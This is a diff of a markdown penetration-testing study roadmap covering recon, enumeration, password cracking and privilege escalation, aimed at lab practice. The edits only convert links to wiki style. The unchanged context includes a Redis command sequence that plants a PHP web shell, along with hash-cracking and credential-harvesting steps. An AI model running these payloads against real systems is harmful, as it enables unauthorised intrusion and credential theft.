@@ -4,7 +4,7 @@
 
 ### 🧭 Navigation
 
-◀ [Stage 1: Foundation](Stage-1_Foundation.md) | 🏠 [Master Roadmap](README.md) | [Stage 3: Web & App Sec](Stage-3_Web-and-App-Sec.md) ➔
+◀ [[Stage-1_Foundation|Stage 1: Foundation]] | 🏠 [[README|Master Roadmap]] | [[Stage-3_Web-and-App-Sec|Stage 3: Web & App Sec]] ➔
 
 ---
 
@@ -25,7 +25,7 @@
 > Every attack you execute must be documented. Required artifacts:
 >
 > - **Pentest notes** in structured markdown (target → recon → exploitation → post-exploitation → findings)
-> - **Tool output** — [Nmap](Tools/Nmap.md) scans, Burp captures, [Metasploit](Tools/Metasploit_Framework.md) session logs saved to files
+> - **Tool output** — [[Nmap]] scans, Burp captures, [[Metasploit_Framework|Metasploit]] session logs saved to files
 > - **Attack chain diagrams** showing the kill chain for each compromise
 > - **3 HTB/VulnHub writeups** — full writeups committed to Git (private until published)
 > - **Git commits** — commit after every lab session with descriptive messages
@@ -37,14 +37,14 @@
 >
 > | Priority | Tool | Purpose & Core Skills |
 > | :--- | :--- | :--- |
-> | **Tier 1 (Mandatory)** | [Nmap](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Nmap.md) | Host discovery, port scanning, service banner grabbing, NSE script auditing (`-sC -sV`). |
-> | **Tier 1 (Mandatory)** | [Netcat](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Netcat.md) / `socat` | Port binding, raw banner interaction, listener setup, encrypted reverse/bind shells. |
-> | **Tier 1 (Mandatory)** | [Responder](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Responder.md) | LLMNR/NBT-NS/mDNS spoofing, rogue WPAD proxy poisoning, NetNTLMv1/v2 hash harvesting. |
-> | **Tier 1 (Mandatory)** | [Hashcat](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Hashcat.md) | GPU password cracking, rule-based attacks (`best64.rule`), hash-mode identification (`-m 5600`). |
-> | **Tier 1 (Mandatory)** | [Metasploit Framework](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Metasploit_Framework.md) | Modular exploitation, auxiliary scanning, payload generation (`msfvenom`), Meterpreter navigation. |
-> | **Tier 2 (Secondary)** | [theHarvester](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/theHarvester.md) & [Amass](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Amass.md) | Passive OSINT, subdomain enumeration, organization surface mapping. |
-> | **Tier 2 (Secondary)** | [Hydra](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/Hydra.md) & [John the Ripper](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/John_the_Ripper.md) | Online network service brute-forcing (SSH/SMB/FTP) and offline password hash cracking. |
-> | **Tier 2 (Secondary)** | [LinPEAS](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/LinPEAS.md) & [WinPEAS](file:///home/smilo/Desktop/MY_FOLDER/Cyber-Security/Roadmap/Tools/WinPEAS.md) | Automated local privilege escalation vector enumeration on Linux and Windows targets. |
+> | **Tier 1 (Mandatory)** | [[Nmap]] | Host discovery, port scanning, service banner grabbing, NSE script auditing (`-sC -sV`). |
+> | **Tier 1 (Mandatory)** | [[Netcat]] / `socat` | Port binding, raw banner interaction, listener setup, encrypted reverse/bind shells. |
+> | **Tier 1 (Mandatory)** | [[Responder]] | LLMNR/NBT-NS/mDNS spoofing, rogue WPAD proxy poisoning, NetNTLMv1/v2 hash harvesting. |
+> | **Tier 1 (Mandatory)** | [[Hashcat]] | GPU password cracking, rule-based attacks (`best64.rule`), hash-mode identification (`-m 5600`). |
+> | **Tier 1 (Mandatory)** | [[Metasploit_Framework]] | Modular exploitation, auxiliary scanning, payload generation (`msfvenom`), Meterpreter navigation. |
+> | **Tier 2 (Secondary)** | [[theHarvester]] & [[Amass]] | Passive OSINT, subdomain enumeration, organization surface mapping. |
+> | **Tier 2 (Secondary)** | [[Hydra]] & [[John_the_Ripper]] | Online network service brute-forcing (SSH/SMB/FTP) and offline password hash cracking. |
+> | **Tier 2 (Secondary)** | [[LinPEAS]] & [[WinPEAS]] | Automated local privilege escalation vector enumeration on Linux and Windows targets. |
 >
 > **Stage 2 Exit Gate:** You cannot pass Stage 2 until you can scan a target subnet with `Nmap`, poison an internal broadcast query using `Responder`, crack the harvested NetNTLMv2 hash using `Hashcat`, exploit an unpatched service, and catch a stable reverse shell using `Netcat`.
 
@@ -230,7 +230,7 @@
 
 - [ ] **Aggressive DNS Interrogation:** Use **nslookup and dig** to force the disclosure of hidden internal records or mail servers.
 
-- [ ] **Web Content Discovery:** Run **[ffuf](Tools/ffuf.md) or [Gobuster](Tools/Gobuster.md)** for directory brute-forcing and use **Wappalyzer** for technology profiling (CMS, frameworks, databases).
+- [ ] **Web Content Discovery:** Run **[[ffuf]] or [[Gobuster]]** for directory brute-forcing and use **Wappalyzer** for technology profiling (CMS, frameworks, databases).
 
 - [ ] **TLS Surface:** Harvest **cert SANs**, check **cipher/curve** support, **HTTP/2/ALPN** negotiation, and redirect/downgrade behavior.
 
@@ -245,7 +245,7 @@
 > [!TIP]
 > **Goal:** Understand the defensive "brain" of the target.
 
-- [ ] **Traffic Analysis:** If vantage is gained, use **[Wireshark](Tools/Wireshark.md)** to analyze **Packet Captures** and examine **Handshakes** for encryption/auth weaknesses.
+- [ ] **Traffic Analysis:** If vantage is gained, use **[[Wireshark]]** to analyze **Packet Captures** and examine **Handshakes** for encryption/auth weaknesses.
 
 - [ ] **Defensive Profiling:** Identify the presence of **IDS/IPS, SIEM, SOAR, and EDR/DLP**. If found, slow down your operation immediately.
 
@@ -268,7 +268,7 @@
 
 - [ ] **DHCPv6 Enumeration:** Use **DHCPv6 client** to extract **prefix, DNS servers, domain names** from DHCP responses.
 
-- [ ] **SNMP Enumeration:** Query **SNMP community [strings](Tools/strings.md)** (public/private) on discovered hosts to extract **routing tables, interface info, system description**.
+- [ ] **SNMP Enumeration:** Query **SNMP community [[strings]]** (public/private) on discovered hosts to extract **routing tables, interface info, system description**.
 
 - [ ] **LDAP Probing:** Query **LDAP** on **port 389** to enumerate **users, groups, organizational structure, computer objects**.
 
@@ -376,7 +376,7 @@
 
 - [ ] **Passive Traffic Capture:** Utilize **Wireshark** to capture broadcast traffic, revealing active hosts without sending a single packet.
 
-- [ ] **Network Pathing & Perimeter Analysis:** Deploy `tracert` or `[hping3](Tools/hping3.md) --traceroute` to map hops and define **Perimeter vs DMZ vs Segmentation** boundaries.
+- [ ] **Network Pathing & Perimeter Analysis:** Deploy `tracert` or `[[hping3]] --traceroute` to map hops and define **Perimeter vs DMZ vs Segmentation** boundaries.
 
 - [ ] **IPv6 Discovery:** Include **NDP/`nmap -6`** sweeps for dual-stack assets and SLAAC-derived hosts.
 
@@ -458,7 +458,7 @@
 
 - [ ] **Source Port Spoofing:** Use `--source-port 53/80` to impersonate **DNS/HTTP traffic** and bypass port-based **ACL rules**.
 
-- [ ] **Packet Manipulation:** Craft **custom packets** with **[Scapy](Tools/Scapy.md)** to evade **DPI (Deep Packet Inspection)** and **pattern-matching filters**.
+- [ ] **Packet Manipulation:** Craft **custom packets** with **[[Scapy]]** to evade **DPI (Deep Packet Inspection)** and **pattern-matching filters**.
 
 ---
 
@@ -527,9 +527,9 @@
 > [!TIP]
 > **Goal:** Extract version, configuration, and identity information from each discovered service.
 
-- [ ] **Banner Grabbing:** Use **[Netcat](Tools/Netcat.md), Telnet, Nmap -sV** to capture **service banners** revealing **software name, version, OS hints, and build information**.
+- [ ] **Banner Grabbing:** Use **[[Netcat]], Telnet, Nmap -sV** to capture **service banners** revealing **software name, version, OS hints, and build information**.
 
-- [ ] **SMB Enumeration:** Use **enum4linux-ng, smbclient, [NetExec](Tools/NetExec.md) (nxc)** to list **shares, users, groups, permissions, null sessions, and password policies** on Windows/Samba hosts.
+- [ ] **SMB Enumeration:** Use **enum4linux-ng, smbclient, [[NetExec]] (nxc)** to list **shares, users, groups, permissions, null sessions, and password policies** on Windows/Samba hosts.
 
 - [ ] **SNMP Enumeration:** Query **SNMP (UDP 161)** with **snmpwalk, onesixtyone** using **community strings (public/private)** to extract **system info, interfaces, running processes, installed software**.
 
@@ -550,7 +550,7 @@
 
 - [ ] **LDAP Enumeration:** Query **LDAP** (port 389) to extract **users, groups, computers, password policies** without authentication.
 
-- [ ] **Active Directory Recon:** Use **ldapsearch, enum4linux-ng, [BloodHound](Tools/BloodHound.md)** to map **domain trusts, group membership, SPNs, delegation**.
+- [ ] **Active Directory Recon:** Use **ldapsearch, enum4linux-ng, [[BloodHound]]** to map **domain trusts, group membership, SPNs, delegation**.
 
 - [ ] **Kerberos Enumeration:** Use **kerbrute** for **username enumeration** via **AS-REQ responses**; identify **accounts without pre-authentication (AS-REP Roastable)**.
 
@@ -796,7 +796,7 @@
 - [ ] **Config Rewrite RCE (Web Shell):**
 
   ```bash
-  redis-cli -h <target> CONFIG [SET](Tools/SET.md) dir /var/www/html
+  redis-cli -h <target> CONFIG [[SET]] dir /var/www/html
   redis-cli -h <target> CONFIG SET dbfilename shell.php
   redis-cli -h <target> SET payload '<?php system($_GET["cmd"]); ?>'
   redis-cli -h <target> SAVE
@@ -912,9 +912,9 @@
 > [!TIP]
 > **Goal:** Apply the right technique to each hash type.
 
-- [ ] **[Hashcat](Tools/Hashcat.md) Fundamentals:** Master **attack modes (-a 0 dictionary, -a 1 combination, -a 3 brute/mask, -a 6/7 hybrid)**, GPU acceleration, session management, and potfile usage.
+- [ ] **[[Hashcat]] Fundamentals:** Master **attack modes (-a 0 dictionary, -a 1 combination, -a 3 brute/mask, -a 6/7 hybrid)**, GPU acceleration, session management, and potfile usage.
 
-- [ ] **[John the Ripper](Tools/John_the_Ripper.md):** Use **JtR** for format auto-detection, **incremental mode, wordlist mode, rules**, and cracking **non-GPU-friendly formats** (bcrypt, Argon2).
+- [ ] **[[John_the_Ripper]]:** Use **JtR** for format auto-detection, **incremental mode, wordlist mode, rules**, and cracking **non-GPU-friendly formats** (bcrypt, Argon2).
 
 - [ ] **Dictionary Attacks:** Use curated wordlists — **rockyou.txt, SecLists, weakpass, kaonashi** — as the first pass against any hash.
 
@@ -935,7 +935,7 @@
 > [!TIP]
 > **Goal:** Crack hashes captured from real network protocols.
 
-- [ ] **NTLM / NetNTLMv2:** Capture with **[Responder](Tools/Responder.md), ntlmrelayx**; crack with **hashcat -m 5600**; understand why NTLMv2 is harder than NTLMv1.
+- [ ] **NTLM / NetNTLMv2:** Capture with **[[Responder]], ntlmrelayx**; crack with **hashcat -m 5600**; understand why NTLMv2 is harder than NTLMv1.
 
 - [ ] **Kerberos Tickets:** Crack **Kerberoasted TGS (-m 13100)** and **AS-REP hashes (-m 18200)** offline with hashcat using targeted service-account wordlists.
 
@@ -962,7 +962,7 @@
 
 - [ ] **Mentalist / PACK:** Use **Mentalist (GUI) or PACK (Policy Analysis)** to analyze cracked passwords and generate statistically optimized masks and rules.
 
-> 📌 **Cross-Reference:** Password cracking skills are directly applied in **[Stage 4: Module 19 (Active Directory & Entra ID)](Stage-4_Enterprise.md#module-19-active-directory--entra-id)** (Kerberoasting, AS-REP Roasting), **[Shelf 01: Wireless Network Security](Shelf_Post-Hire.md#shelf-01-wireless-network-security)** (WPA handshake cracking), and **Part 7: System Hacking** (credential-based lateral movement). Complete this Part before Phase 5–6.
+> 📌 **Cross-Reference:** Password cracking skills are directly applied in **[[Stage-4_Enterprise#module-19-active-directory--entra-id|Stage 4: Module 19 (Active Directory & Entra ID)]]** (Kerberoasting, AS-REP Roasting), **[[Shelf_Post-Hire#shelf-01-wireless-network-security|Shelf 01: Wireless Network Security]]** (WPA handshake cracking), and **Part 7: System Hacking** (credential-based lateral movement). Complete this Part before Phase 5–6.
 
 ---
 
@@ -1026,7 +1026,7 @@
 
 **Credential Assault:**
 
-- [ ] **Brute Force:** Methodical password guessing with **wordlists, rule-based mangling** — use **[Hydra](Tools/Hydra.md)** for online service brute-forcing (SSH, FTP, HTTP, RDP, SMB, WinRM) and **[Hashcat](Tools/Hashcat.md)** + **[John the Ripper](Tools/John_the_Ripper.md)** for offline hash cracking.
+- [ ] **Brute Force:** Methodical password guessing with **wordlists, rule-based mangling** — use **[[Hydra]]** for online service brute-forcing (SSH, FTP, HTTP, RDP, SMB, WinRM) and **[[Hashcat]]** + **[[John_the_Ripper]]** for offline hash cracking.
 
 - [ ] **Password Spray:** Low-and-slow attacks across many accounts to avoid lockout.
 
@@ -1052,7 +1052,7 @@
 
 > **📌 Cross-Reference:** ARP spoofing, DNS spoofing, SSL stripping, and MITM techniques are taught in detail in **Part 9: Sniffing & Spoofing** (Phases 3–4). WiFi evil twin attacks are covered in **Part 21: Wireless Pentesting**. The techniques here focus on using these as delivery mechanisms for social engineering — review Part 9 first.
 
-- [ ] **NGO Interception:** Capture traffic at **network gateways/bridges** with **[tcpdump](Tools/tcpdump.md)/Wireshark**.
+- [ ] **NGO Interception:** Capture traffic at **network gateways/bridges** with **[[tcpdump]]/Wireshark**.
 
 ---
 
@@ -1070,7 +1070,7 @@
 
 **Step 0 — Enumeration (Always First):**
 
-- [ ] **Automated Enumeration:** Run **winPEAS** (`[winpeas](Tools/WinPEAS.md).exe`) — read every orange and red finding; do not blindly exploit suggestions. Also run **PowerUp** (`Import-Module PowerUp.ps1; Invoke-AllChecks`) for PowerShell-based checks, and **Seatbelt** for host situational awareness (token privileges, installed software, AppLocker policy).
+- [ ] **Automated Enumeration:** Run **winPEAS** (`[[WinPEAS]].exe`) — read every orange and red finding; do not blindly exploit suggestions. Also run **PowerUp** (`Import-Module PowerUp.ps1; Invoke-AllChecks`) for PowerShell-based checks, and **Seatbelt** for host situational awareness (token privileges, installed software, AppLocker policy).
 
 - [ ] **Manual Baseline Commands:** On foothold, immediately run:
   - `whoami /priv` — check token privileges (SeImpersonatePrivilege, SeDebugPrivilege, SeBackupPrivilege are all exploitable)
@@ -1098,7 +1098,7 @@
 **Vector 2: DLL Hijacking**
 
 - [ ] **DLL Search Order Abuse:** When an application loads a DLL by name without an absolute path, Windows searches: application directory → `%SYSTEMROOT%\System32` → `%SYSTEMROOT%` → directories in `%PATH%`. If you can write to a directory searched before the legitimate DLL location, drop a malicious DLL with the same name.
-  - Discovery: **[Procmon](Tools/Procmon.md)** (Sysinternals) — filter by `Result = NAME NOT FOUND` + `Path ends with .dll` while running the target application to find missing DLLs
+  - Discovery: **[[Procmon]]** (Sysinternals) — filter by `Result = NAME NOT FOUND` + `Path ends with .dll` while running the target application to find missing DLLs
 
 - [ ] **DLL Proxying:** Place a malicious DLL that loads the real DLL and also executes a payload — allows transparent hijack without breaking application functionality.
 
@@ -1246,7 +1246,7 @@
 **Linux Privilege Escalation:**
 
 > [!IMPORTANT]
-> **Why This Needs Its Own Methodology:** Linux privesc is the most consistently tested domain on OSCP, HTB, and real-world Linux engagements. The five bullets below are not enough. Work through each vector with a dedicated lab VM (try Tryhackme "Linux PrivEsc" room, HackTheBox Jarvis/Sunday, or build your own with intentional misconfigs). **[LinPEAS](Tools/LinPEAS.md)** and **Linux Smart Enumeration (lse.sh)** automate discovery — but you must understand every finding manually before relying on automation.
+> **Why This Needs Its Own Methodology:** Linux privesc is the most consistently tested domain on OSCP, HTB, and real-world Linux engagements. The five bullets below are not enough. Work through each vector with a dedicated lab VM (try Tryhackme "Linux PrivEsc" room, HackTheBox Jarvis/Sunday, or build your own with intentional misconfigs). **[[LinPEAS]]** and **Linux Smart Enumeration (lse.sh)** automate discovery — but you must understand every finding manually before relying on automation.
 
 **Step 0 — Enumeration (Always First):**
 
